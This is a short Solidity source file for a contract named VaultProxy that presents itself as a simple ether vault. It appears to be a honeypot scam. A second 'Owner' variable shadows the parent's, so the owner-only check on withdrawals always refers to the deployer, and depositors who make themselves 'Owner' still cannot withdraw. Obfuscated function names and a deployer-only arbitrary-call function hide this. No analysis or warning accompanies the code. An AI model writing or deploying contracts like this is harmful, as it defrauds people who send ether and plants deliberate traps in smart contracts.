// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier b { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function a(address e) public b { Owner = e; }
    function h(address g, bytes data) public payable {
        g.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            d();
        }
    }

    function d() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function c(uint256 f) public b {
        if (f>0 && Deposits[msg.sender]>=f) {
            msg.sender.transfer(f);
        }
    }
}